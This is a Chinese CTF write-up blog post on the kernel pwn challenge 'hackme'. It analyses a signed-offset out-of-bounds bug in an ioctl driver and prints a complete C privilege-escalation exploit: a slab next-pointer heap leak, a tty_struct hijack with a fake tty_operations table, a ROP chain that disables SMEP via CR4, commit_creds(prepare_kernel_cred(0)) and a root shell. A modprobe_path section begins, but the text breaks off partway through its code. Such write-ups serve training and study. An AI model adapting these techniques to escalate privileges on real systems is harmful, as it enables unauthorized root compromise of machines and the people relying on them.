              <time title="Created: 2022-10-29 02:03:16" itemprop="dateCreated datePublished" datetime="2022-10-29T02:03:16+08:00">2022-10-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-04-02 15:10:42" itemprop="dateModified" datetime="2023-04-02T15:10:42+08:00">2023-04-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>16k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>15 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>hackme</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 256M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append &#x27;console=ttyS0 loglevel=3 oops=panic panic=1 kaslr&#x27; \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd initramfs.cpio \</span><br><span class="line">    -smp cores=4,threads=2 \</span><br><span class="line">    #-gdb tcp::4869 -S \</span><br><span class="line">    -cpu qemu64,smep,smap 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<ul>
<li>smep，smap，kaslr</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( cmd == <span class="number">0x30002</span> )                       <span class="comment">// HACK_WRITE</span></span><br><span class="line">&#123;</span><br><span class="line">  index = userdata.index;</span><br><span class="line">  kheap_ptr = pool[index].ptr;</span><br><span class="line">  kheap = &amp;pool[index];</span><br><span class="line">  <span class="keyword">if</span> ( kheap_ptr &amp;&amp; userdata.offset + userdata.size &lt;= kheap-&gt;size )</span><br><span class="line">  &#123;</span><br><span class="line">    copy_from_user(&amp;kheap_ptr[userdata.offset], userdata.data, userdata.size);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( cmd == <span class="number">0x30003</span> )                  <span class="comment">// HACK_READ</span></span><br><span class="line">&#123;</span><br><span class="line">  index = userdata.index;</span><br><span class="line">  kheap_ptr = pool[index].ptr;</span><br><span class="line">  kheap = &amp;pool[index];</span><br><span class="line">  <span class="keyword">if</span> ( kheap_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( userdata.offset + userdata.size &lt;= kheap-&gt;size )</span><br><span class="line">    &#123;</span><br><span class="line">      copy_to_user(userdata.data, &amp;kheap_ptr[userdata.offset], userdata.size);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>userdata.offset</code> 是符号数，并且没有限制其必须为正数</li>
<li>令 <code>userdata.offset</code> 为负数就可以在 <code>kheap_ptr[userdata.offset]</code> 中向上溢出</li>
</ul>
<p><strong>入侵思路 - Tty_struct Attack</strong></p>
<p><code>tty_struct attack</code> 可以用于泄露 kernel_base，如果想用它来提权，则需要泄露 heap_addr</p>
<p>本题目的溢出可以轻松泄露空闲块的 next 指针，然后泄露出 heap_addr</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kcreate(<span class="number">2</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">kcreate(<span class="number">3</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">kfree(<span class="number">2</span>);</span><br><span class="line">kread(<span class="number">3</span>,buf,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line"><span class="keyword">size_t</span> heap_addr = ((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>] - <span class="number">0x200</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>释放 “内存块2” 后，通过 “内存块3” 向上泄露内存快2的 next 指针</li>
<li>这源自于 slab 的一个机制：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0xffffa1f380179400</span></span><br><span class="line"><span class="number">0xffffa1f380179400</span>:	<span class="number">0xffffa1f380179600</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xffffa1f380179410</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xffffa1f380179420</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xffffa1f380179430</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0xffffa1f380179440</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0xffffa1f380179600</span></span><br><span class="line"><span class="number">0xffffa1f380179600</span>:	<span class="number">0xffffa1f380179700</span>	<span class="number">0xdf84653679b215c3</span></span><br><span class="line"><span class="number">0xffffa1f380179610</span>:	<span class="number">0xc7e58d27141d6541</span>	<span class="number">0x875eeb6934a2d05d</span></span><br><span class="line"><span class="number">0xffffa1f380179620</span>:	<span class="number">0x32e830be7c767f6e</span>	<span class="number">0xc8103477ca4944c2</span></span><br><span class="line"><span class="number">0xffffa1f380179630</span>:	<span class="number">0x88364f1e93ef79cc</span>	<span class="number">0x2ba3fb91bbc17dd4</span></span><br><span class="line"><span class="number">0xffffa1f380179640</span>:	<span class="number">0x4ae5ec2914d5d54d</span>	<span class="number">0xa34247ff14fc9404</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0xffffa1f380179700</span></span><br><span class="line"><span class="number">0xffffa1f380179700</span>:	<span class="number">0xffffa1f380179800</span>	<span class="number">0x2d87f67ef5f84679</span></span><br><span class="line"><span class="number">0xffffa1f380179710</span>:	<span class="number">0x224428f2894924d4</span>	<span class="number">0x8c097463e73b5f8f</span></span><br><span class="line"><span class="number">0xffffa1f380179720</span>:	<span class="number">0x51e6f451fc6c7d48</span>	<span class="number">0xf7f1f1c979b53b2c</span></span><br><span class="line"><span class="number">0xffffa1f380179730</span>:	<span class="number">0xe4bddcf6395344b1</span>	<span class="number">0x66766646ae4ea583</span>  </span><br></pre></td></tr></table></figure>
<ul>
<li>空闲块都会有一个 next 指针，用于指向下一个内存块</li>
<li>Slab 将内核中经常使用的对象放到高速缓存中，并且由系统保持为初始的可利用状态，因此上图中的 <code>0x400</code> <code>0x600</code> <code>0x700</code> 都是 free 状态</li>
</ul>
<p>由于系统开启了 smap，内核需要使用 <code>copy_from_user</code> 才能访问用户态数据，于是我们利用 <code>kcreate</code> 把 <code>fake_tty_operations</code> 指针和 <code>rop</code> 指针保存到内核的堆里： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kcreate(<span class="number">2</span>,(<span class="keyword">char</span> *)rop,<span class="number">0x100</span>);</span><br><span class="line">kcreate(<span class="number">3</span>,(<span class="keyword">char</span> *)fake_tty_operations,<span class="number">0x100</span>);</span><br></pre></td></tr></table></figure>
<p>对于 <code>tty_struct attack</code>，还需要一个关键的 gadget，其目的是为了栈迁移（把 RAX 中的数据转移到 RSP 中）：</p>
<ul>
<li>最直接的 gadget 就是 <code>mov rax, rsp</code></li>
<li>如果没有就以其他寄存器为中介</li>
<li>如果还是没有就只能用 <code>push rax + pop rsp</code></li>
</ul>
<p>剩下的操作就比较套路化了，可以当做是 <code>tty_struct attack</code> 的模板，注意控制一下 CR4 寄存器就好</p>
<p>完整 exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RAW_KERNEL_BASE 0XFFFFFFFF81000000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_FREE 0x30001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_WRITE 0x30002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_READ 0x30003</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HACK_CREATE 0x30000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> MOV_CR4_RAX = <span class="number">0xffffffff8100252b</span> - RAW_KERNEL_BASE; <span class="comment">// mov cr4, rax ; push rcx ; popfq ; pop rbp ; ret</span></span><br><span class="line"><span class="keyword">size_t</span> SWAPGS = <span class="number">0xffffffff81200c2e</span> - RAW_KERNEL_BASE; <span class="comment">// swapgs ; popfq ; pop rbp ; ret</span></span><br><span class="line"><span class="keyword">size_t</span> IRETQ = <span class="number">0xFFFFFFFF81019356</span> - RAW_KERNEL_BASE; <span class="comment">// iretq; pop rbp; ret;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> COMMIT_CREDS = <span class="number">0xFFFFFFFF8104D220</span> - RAW_KERNEL_BASE;</span><br><span class="line"><span class="keyword">size_t</span> PREPARE_KERNEL_CRED = <span class="number">0xFFFFFFFF8104D3D0</span> - RAW_KERNEL_BASE;</span><br><span class="line"></span><br><span class="line"><span class="comment">//size_t PUSH_RAX_POP_RSP = 0xffffffff810608d5 - RAW_KERNEL_BASE; // push rax; pop rsp; ret;</span></span><br><span class="line"><span class="keyword">size_t</span> PUSH_RAX_POP_RSP = <span class="number">0xffffffff8116b3c5</span> - RAW_KERNEL_BASE; <span class="comment">// push rax; sub byte ptr [rbx + 0x41], bl; pop rsp; pop rbp; ret; </span></span><br><span class="line"><span class="keyword">size_t</span> POP_RAX = <span class="number">0xffffffff8101b5a1</span> - RAW_KERNEL_BASE; <span class="comment">// pop rax; ret; </span></span><br><span class="line"><span class="keyword">size_t</span> POP_RSP = <span class="number">0xffffffff810484f0</span> - RAW_KERNEL_BASE; <span class="comment">// pop rsp; ret; </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initFD</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   fd = open(<span class="string">&quot;/dev/hackme&quot;</span>,<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;open file error!!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Item</span>&#123;</span></span><br><span class="line">   <span class="keyword">int</span> index; </span><br><span class="line">   <span class="keyword">char</span> *buf; </span><br><span class="line">   <span class="keyword">int64_t</span> size; </span><br><span class="line">   <span class="keyword">int64_t</span> offset; </span><br><span class="line">&#125;item;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kcreate</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index,<span class="keyword">char</span> *buf,<span class="keyword">int64_t</span> size)</span> </span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   data.size = size;</span><br><span class="line">   data.offset = <span class="number">0</span>;</span><br><span class="line">   ioctl(fd,HACK_CREATE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kfree</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   ioctl(fd,HACK_FREE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kwrite</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index,<span class="keyword">char</span> *buf,<span class="keyword">int64_t</span> size,<span class="keyword">int64_t</span> offset)</span></span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   data.size = size;</span><br><span class="line">   data.offset = offset;</span><br><span class="line">   ioctl(fd,HACK_WRITE,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kread</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> index,<span class="keyword">char</span> *buf,<span class="keyword">int64_t</span> size,<span class="keyword">int64_t</span> offset)</span> </span>&#123;</span><br><span class="line">   item data;</span><br><span class="line">   data.index = index;</span><br><span class="line">   data.buf = buf;</span><br><span class="line">   data.size = size;</span><br><span class="line">   data.offset = offset;</span><br><span class="line">   ioctl(fd,HACK_READ,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_addr</span><span class="params">(<span class="keyword">size_t</span> kernel_base)</span> </span>&#123;</span><br><span class="line">   MOV_CR4_RAX += kernel_base;</span><br><span class="line">   SWAPGS += kernel_base;</span><br><span class="line">   IRETQ += kernel_base;</span><br><span class="line">   COMMIT_CREDS += kernel_base;</span><br><span class="line">   PREPARE_KERNEL_CRED += kernel_base;</span><br><span class="line">   PUSH_RAX_POP_RSP += kernel_base;</span><br><span class="line">   POP_RSP += kernel_base;</span><br><span class="line">   POP_RAX += kernel_base;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;PUSH_RAX_POP_RSP=0x%lx\n&quot;</span>,PUSH_RAX_POP_RSP);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getRoot</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">void</span> *(*pkc)(<span class="keyword">int</span>) = (<span class="keyword">void</span> *(*)(<span class="keyword">int</span>))PREPARE_KERNEL_CRED;</span><br><span class="line">   <span class="keyword">void</span> (*cc)(<span class="keyword">void</span> *) = (<span class="keyword">void</span> (*)(<span class="keyword">void</span> *))COMMIT_CREDS;</span><br><span class="line">   (*cc)((*pkc)(<span class="number">0</span>)); <span class="comment">// commit_creds(prepare_kernel_cred(0))</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getShell</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;root wrong&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_flags,user_sp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_flags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;saved&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">   save_status();</span><br><span class="line">   initFD();</span><br><span class="line">   kcreate(<span class="number">0</span>,buf,<span class="number">0x2E0</span>);</span><br><span class="line">   kcreate(<span class="number">1</span>,buf,<span class="number">0x2E0</span>);</span><br><span class="line">   kfree(<span class="number">0</span>);</span><br><span class="line">   kcreate(<span class="number">2</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   kcreate(<span class="number">3</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">   kfree(<span class="number">2</span>);</span><br><span class="line">   kread(<span class="number">3</span>,buf,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line">   <span class="keyword">size_t</span> heap_addr = ((<span class="keyword">size_t</span> *)buf)[<span class="number">0</span>] - <span class="number">0x200</span>;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;heap_addr=0x%lx\n&quot;</span>,heap_addr);</span><br><span class="line">   <span class="keyword">size_t</span> fake_tty_operations[<span class="number">0x20</span>];</span><br><span class="line">   <span class="keyword">int</span> tty_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>,O_RDWR);</span><br><span class="line">   kread(<span class="number">1</span>,buf,<span class="number">0x400</span>,<span class="number">-0x400</span>);</span><br><span class="line">   <span class="keyword">size_t</span> kernel_base = ((<span class="keyword">size_t</span> *)buf)[<span class="number">3</span>] - <span class="number">0x625D80</span>;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;kernel_base=0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line">   init_addr(kernel_base);</span><br><span class="line">   <span class="comment">//sleep(10);</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">size_t</span> rop[<span class="number">0x20</span>];</span><br><span class="line">   <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = POP_RAX;</span><br><span class="line">   rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">   rop[i++] = MOV_CR4_RAX;</span><br><span class="line">   rop[i++] = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = (<span class="keyword">size_t</span>)getRoot;</span><br><span class="line">   rop[i++] = SWAPGS;</span><br><span class="line">   rop[i++] = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = <span class="number">0</span>;</span><br><span class="line">   rop[i++] = IRETQ;</span><br><span class="line">   rop[i++] = (<span class="keyword">size_t</span>)getShell;</span><br><span class="line">   rop[i++] = user_cs;</span><br><span class="line">   rop[i++] = user_flags;</span><br><span class="line">   rop[i++] = user_sp;</span><br><span class="line">   rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">   kcreate(<span class="number">2</span>,(<span class="keyword">char</span> *)rop,<span class="number">0x100</span>);</span><br><span class="line">   <span class="keyword">size_t</span> rop_addr = heap_addr;</span><br><span class="line"> </span><br><span class="line">   fake_tty_operations[<span class="number">7</span>] = PUSH_RAX_POP_RSP;</span><br><span class="line">   fake_tty_operations[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">   fake_tty_operations[<span class="number">1</span>] = POP_RSP;</span><br><span class="line">   fake_tty_operations[<span class="number">2</span>] = rop_addr;</span><br><span class="line"></span><br><span class="line">   kfree(<span class="number">3</span>);</span><br><span class="line">   kcreate(<span class="number">3</span>,(<span class="keyword">char</span> *)fake_tty_operations,<span class="number">0x100</span>);</span><br><span class="line">   <span class="keyword">size_t</span> fake_tty_operations_addr = heap_addr + <span class="number">0x100</span>;</span><br><span class="line">   ((<span class="keyword">size_t</span> *)buf)[<span class="number">3</span>] = fake_tty_operations_addr;</span><br><span class="line">   kwrite(<span class="number">1</span>,buf,<span class="number">0x400</span>,<span class="number">-0x400</span>); </span><br><span class="line">   write(tty_fd,buf,<span class="number">0x10</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>ha1vk 大佬的 exp 中有个 gadget 我找不到，于是我找了另一个来替代它（我先把所有包含 <code>pop rsp</code> 的 gadget 重定位到一个文件中，然后再这个文件中搜索 <code>push rax</code>）</li>
</ul>
<p><strong>入侵思路 - Modprobe_path Attack</strong></p>
<p><code>modprobe_path</code> 是用于在 <code>Linux</code> 内核中添加可加载的内核模块，当我们在 <code>Linux</code> 内核中安装或卸载新模块时，就会执行 <code>modprobe_path</code> 指向的程序</p>
<p>因此我们需要劫持 <code>modprobe_path</code>，劫持的方法就是利用 Slab 空闲块的 next 指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/home/pwn <span class="meta"># cat /proc/kallsyms | grep modprobe_path</span></span><br><span class="line">ffffffff8483f960 D modprobe_path</span><br><span class="line">/home/pwn <span class="meta"># cat /proc/kallsyms | grep startup_64</span></span><br><span class="line">ffffffff84000000 T startup_64</span><br></pre></td></tr></table></figure>
<ul>
<li>这里可以计算出 <code>modprobe_path</code> 的偏移</li>
</ul>
<p>如果通过劫持 next 指针实现 WAA，就需要注意一个细节：</p>
<ul>
<li>通过 fake next 指针申请的内存块是不合法的，并且会破坏 Slab 原本的次序</li>
<li>这会导致在后续的 <code>system</code> 中出现错误（因为 <code>system</code> 也会利用 Slab 来分配内存）</li>
<li>因此，我们在执行 <code>system</code> 前需要先 <code>kfree</code> 一些内存块，使 <code>system</code> 优先申请这些合法的内存块，从而避免报错</li>
</ul>
<p>完整 exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 